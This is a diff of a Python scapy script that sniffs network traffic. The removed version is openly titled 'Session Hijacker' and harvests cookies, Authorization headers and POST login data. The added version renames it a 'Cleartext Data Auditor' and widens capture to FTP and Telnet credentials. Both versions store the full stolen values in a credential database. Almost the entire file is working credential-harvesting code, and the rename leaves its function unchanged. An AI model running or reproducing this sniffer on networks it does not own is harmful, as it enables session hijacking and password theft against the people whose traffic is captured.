@@ -1,101 +1,131 @@
 """
-Session Hijacker — Credential & Cookie Sniffer
-==============================================
-Intercepts and extracts sensitive authentication tokens, session cookies,
-and login credentials from unencrypted HTTP traffic.
+Radar Cleartext Data Auditor — Insecure Protocol Sniffer
+========================================================
+Audits the network for sensitive data (credentials, tokens, personal info) 
+being transmitted without encryption.
 
 Usage:
-    sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.hijacker <target_ip>
+    sudo make hijack [IP=target_ip]
 """
 
 import sys
 import logging
+import re
+import json
 from scapy.all import sniff, IP, TCP, Raw
 from radar.database.vault import Vault
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format="%(message)s")
-logger = logging.getLogger("hijacker")
+logger = logging.getLogger("auditor")
 
-class SessionHijacker:
+class CleartextAuditor:
     def __init__(self, target_ip: str = None):
         self.target_ip = target_ip
         self.vault = Vault()
         self.captured_count = 0
+        
+        # Regex for sensitive fields in forms/JSON
+        self.sensitive_patterns = [
+            r"user", r"pass", r"login", r"email", r"pwd", r"token", 
+            r"secret", r"key", r"auth", r"account", r"credential"
+        ]
+        self.field_re = re.compile(rf"({'|'.join(self.sensitive_patterns)})", re.IGNORECASE)
+
+    def _extract_post_data(self, body):
+        """Attempts to parse form data or JSON for sensitive fields."""
+        found = []
+        # Try JSON first
+        try:
+            data = json.loads(body)
+            if isinstance(data, dict):
+                for k, v in data.items():
+                    if self.field_re.search(k):
+                        found.append(f"{k}={v}")
+        except:
+            # Fallback to form-urlencoded
+            pairs = body.split('&')
+            for pair in pairs:
+                if '=' in pair:
+                    k, v = pair.split('=', 1)
+                    if self.field_re.search(k):
+                        found.append(pair)
+        return found
 
     def _process_packet(self, pkt):
-        """Analyzes a packet for sensitive HTTP headers."""
-        if not pkt.haslayer(Raw):
+        if not pkt.haslayer(Raw) or not pkt.haslayer(IP):
             return
 
         try:
             payload = pkt[Raw].load.decode(errors='ignore')
-            
-            # We only care about HTTP headers
-            if "HTTP" not in payload:
-                return
-
             src_ip = pkt[IP].src
             dst_ip = pkt[IP].dst
-            
-            # Identify Host
-            host = "Unknown"
-            for line in payload.splitlines():
-                if line.lower().startswith("host:"):
-                    host = line.split(":", 1)[1].strip()
-                    break
+            dport = pkt[TCP].dport
 
-            # 1. Look for Cookies
-            if "Cookie:" in payload:
+            # --- 1. HTTP AUDIT (Port 80/8080) ---
+            if dport in [80, 8080] and "HTTP" in payload:
+                # Identify Host
+                host = "Unknown"
                 for line in payload.splitlines():
-                    if line.lower().startswith("cookie:"):
-                        cookie_val = line.split(":", 1)[1].strip()
-                        self._report_cred(src_ip, host, "Cookie", cookie_val, line)
+                    if line.lower().startswith("host:"):
+                        host = line.split(":", 1)[1].strip()
+                        break
 
-            # 2. Look for Authorization Headers
-            if "Authorization:" in payload:
-                for line in payload.splitlines():
-                    if line.lower().startswith("authorization:"):
-                        auth_val = line.split(":", 1)[1].strip()
-                        self._report_cred(src_ip, host, "Auth-Token", auth_val, line)
+                # Captured Headers (Cookie/Auth)
+                if "Cookie:" in payload:
+                    cookie = next((l for l in payload.splitlines() if l.lower().startswith("cookie:")), "")
+                    self._report_leak(src_ip, host, "Insecure Cookie", cookie, payload[:100])
+                
+                if "Authorization:" in payload:
+                    auth = next((l for l in payload.splitlines() if l.lower().startswith("authorization:")), "")
+                    self._report_leak(src_ip, host, "Cleartext Auth", auth, payload[:100])
 
-            # 3. Look for POST data credentials (very basic)
-            if "user=" in payload.lower() or "pass=" in payload.lower() or "pwd=" in payload.lower():
-                # Usually at the end of the payload after headers
-                body = payload.split("\\r\\n\\r\\n")[-1]
-                if body:
-                    self._report_cred(src_ip, host, "POST-Data", body, "Raw POST Body")
+                # Captured Form/POST Data
+                if "POST" in payload:
+                    parts = payload.split("\r\n\r\n")
+                    if len(parts) > 1:
+                        leaks = self._extract_post_data(parts[1])
+                        if leaks:
+                            self._report_leak(src_ip, host, "Cleartext Form Data", ", ".join(leaks), parts[1])
 
-        except Exception as e:
-            # logger.debug(f"Error parsing packet: {e}")
+            # --- 2. FTP AUDIT (Port 21) ---
+            elif dport == 21:
+                if "USER " in payload or "PASS " in payload:
+                    self._report_leak(src_ip, dst_ip, "FTP Credential", payload.strip(), "FTP Protocol")
+
+            # --- 3. TELNET AUDIT (Port 23) ---
+            elif dport == 23:
+                # Telnet is character-by-character usually, but we catch simple strings
+                if len(payload.strip()) > 1:
+                    self._report_leak(src_ip, dst_ip, "Telnet Traffic", payload.strip(), "Telnet Protocol")
+
+        except Exception:
             pass
 
-    def _report_cred(self, ip, host, c_type, value, raw):
-        """Logs the credential and saves it to the database."""
-        # Simple deduplication (don't log the same value twice in one run)
-        logger.info(f"\\n[!] HIJACKED {c_type} from {ip}")
-        logger.info(f"    Host: {host}")
-        logger.info(f"    Value: {value[:100]}...")
+    def _report_leak(self, ip, host, leak_type, value, context):
+        """Logs the security leak and saves it to the database."""
+        print(f"\n[!] SECURITY ALERT: {leak_type} from {ip}")
+        print(f"    Target: {host}")
+        print(f"    Leaked Data: {value[:120]}...")
         
-        self.vault.insert_credential(ip, host, c_type, value, raw)
+        self.vault.insert_credential(ip, host, leak_type, value, context)
         self.captured_count += 1
 
     def start(self):
-        """Starts the sniffer."""
-        filter_str = f"tcp port 80"
+        filter_str = "tcp port 80 or tcp port 8080 or tcp port 21 or tcp port 23"
         if self.target_ip:
-            filter_str += f" and host {self.target_ip}"
-            logger.info(f"📡 Harvesting sessions for {self.target_ip}...")
+            filter_str = f"({filter_str}) and host {self.target_ip}"
+            logger.info(f"🛡️  Auditing all data for {self.target_ip}...")
         else:
-            logger.info("📡 Harvesting sessions for ALL devices...")
+            logger.info("🛡️  Auditing all network data for security leaks...")
 
         try:
             sniff(filter=filter_str, prn=self._process_packet, store=0)
         except KeyboardInterrupt:
-            logger.info(f"\\nStopping harvester. Total credentials captured: {self.captured_count}")
+            logger.info(f"\nAudit complete. Total security leaks found: {self.captured_count}")
             sys.exit(0)
 
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else None
-    hijacker = SessionHijacker(target)
-    hijacker.start()
+    auditor = CleartextAuditor(target)
+    auditor.start()
